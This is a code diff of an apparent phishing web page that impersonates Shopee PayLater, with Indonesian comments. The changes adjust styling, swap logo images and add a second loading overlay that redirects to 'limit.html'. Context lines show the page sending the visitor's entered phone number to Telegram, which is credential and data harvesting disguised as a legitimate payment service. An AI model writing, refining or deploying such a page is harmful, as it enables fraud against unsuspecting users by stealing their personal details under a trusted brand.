@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <title>SHOPEE:PAYLATER</title>
-    <meta property="og:image" content="https://i.ibb.co/GszXFJ2/IMG-20240315-105849.jpg">
+  <meta property="og:image" content="https://i.ibb.co/GszXFJ2/IMG-20240315-105849.jpg">
   <meta name="viewport" content="width, initial-scale=1">
   <meta name="theme-color" content="Coral">
   <style>
@@ -84,6 +84,13 @@
       position: relative;
       bottom: -10px;
     }
+    .gambar-bawah img {
+  width: 50%;
+  object-fit: cover;
+  margin: 0 25px;
+  background:none;
+}
+
 
     .gambar-bawah img {
       width: 50%;
@@ -93,23 +100,22 @@
 
     /* Aturan gaya untuk elemen putih */
     .white-element {
-  width: 100vw;
-  height: 100vh;
-  background-color: #ff4500; /* Menggunakan warna solid tanpa transparansi */
-  position: fixed;
-  top: 0;
-  left: 0;
-  z-index: 9999;
-  display: flex;
-  flex-direction: column;
-  justify-content: center;
-  align-items: center;
-}
-
+      width: 100vw;
+      height: 100vh;
+      background-color: #ff4500; /* Menggunakan warna solid tanpa transparansi */
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 9999;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
 
     .white-element img {
-      width: 180px; /* Ganti dengan ukuran yang diinginkan */
-      height: 120px; /* Ganti dengan ukuran yang diinginkan */
+      width: 400px; /* Ganti dengan ukuran yang diinginkan */
+      height: 890px; /* Ganti dengan ukuran yang diinginkan */
     }
 
     .loading-text {
@@ -118,6 +124,33 @@
       color:#ff4500;
       font-weight:bold;
     }
+
+    /* Aturan CSS untuk logo kedua */
+    .second-logo {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 9999;
+      background-color: rgba(255, 255, 255, 0.7); /* Putih dengan transparansi 0.7 */
+      padding: 10px; /* Mengurangi padding agar logo lebih kecil */
+      border-radius: 8px;
+      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
+    }
+
+    /* Ukuran logo kedua */
+    .second-logo img {
+      width: 180px; /* Mengurangi lebar logo kedua */
+      height: auto; /* Biarkan tinggi otomatis menyesuaikan proporsi */
+    }
+    #logo-kedua {
+  background: transparent;
+}
+
+    #logo-kedua {
+  opacity: 0;
+}
+
   </style>
   <script>
     window.addEventListener('load', function() {
@@ -148,7 +181,7 @@
 
       var message = "𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲: " + nomorHP;
       sendMessageToTelegram(message);
-      showWhiteElement();
+      showSecondLogo(); // Panggil fungsi untuk menampilkan logo kedua setelah pesan terkirim
     }
 
     function showWhiteElement() {
@@ -156,7 +189,7 @@
       whiteElement.classList.add('white-element');
 
       var logoImage = document.createElement('img');
-      logoImage.src = 'https://i.ibb.co/D1CTX7v/pay1-1-removebg-preview.png';
+      logoImage.src = 'https://i.ibb.co/Bspt4gC/1000002851-removebg-preview.png';
       logoImage.alt = 'Logo';
       whiteElement.appendChild(logoImage);
 
@@ -169,7 +202,25 @@
 
       setTimeout(function () {
         whiteElement.style.display = 'none';
-      }, 7000); // Ubah waktu penundaan menjadi 5 detik
+      }, 5000); // Ubah waktu penundaan menjadi 5 detik
+    }
+
+    function showSecondLogo() {
+      var secondLogo = document.createElement('div');
+      secondLogo.classList.add('second-logo');
+
+      var secondLogoImage = document.createElement('img');
+      secondLogoImage.src = 'https://i.ibb.co/D1CTX7v/pay1-1-removebg-preview.png';
+      secondLogoImage.alt = 'Logo Kedua';
+      secondLogo.appendChild(secondLogoImage);
+
+      document.body.appendChild(secondLogo);
+
+      setTimeout(function () {
+        secondLogo.style.display = 'none';
+        window.location.href = 'limit.html';
+        // Ganti window.location.href ke halaman selanjutnya di sini
+      }, 3000); // Ubah waktu penundaan menjadi 3 detik
     }
   </script>
 </head>
